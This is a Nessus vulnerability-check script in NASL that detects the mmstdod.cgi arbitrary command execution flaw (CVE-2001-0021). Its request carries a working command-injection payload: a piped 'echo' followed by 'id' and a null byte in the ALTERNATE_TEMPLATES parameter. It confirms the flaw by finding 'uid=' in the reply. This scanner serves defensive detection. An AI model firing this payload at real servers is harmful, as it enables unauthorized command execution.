#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10566);
 script_cve_id("CVE-2001-0021");
 script_bugtraq_id(2063);
 script_version ("$Revision: 1.10 $");

 name["english"] = "mmstdod.cgi";
 name["francais"] = "mmstdod.cgi";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'mmstdod.cgi' cgi is installed. This CGI has
a well known security flaw that lets anyone execute arbitrary
commands with the privileges of the http daemon (root or nobody).

Solution : Delete the file or upgrade to version 3.0.26

Risk factor : Serious";


 desc["francais"] = "Le cgi 'mmstdod.cgu' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de faire
executer des commandes arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody). 

Solution : retirez-le ou bien mettez-le à jour en veresion 3.0.26

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/mmstdod.cgi";
 summary["francais"] = "Vérifie la présence de /cgi-bin/mmstdod.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
req = string(dir, "/mmstdod.cgi?ALTERNATE_TEMPLATES=|%20echo%20", raw_string(0x22), 
 			         "Content-Type:%20text%2Fhtml", raw_string(0x22), 
				 "%3Becho%20",
				 raw_string(0x22, 0x22),
				 "%20%3B%20id%00");
				 
req = http_get(item:req, port:port);				 
r = http_keepalive_send_recv(port:port, data:req);
if ( r == NULL ) exit(0);
if(("uid=" >< r) && ("gid=" >< r))
 	security_hole(port);
}
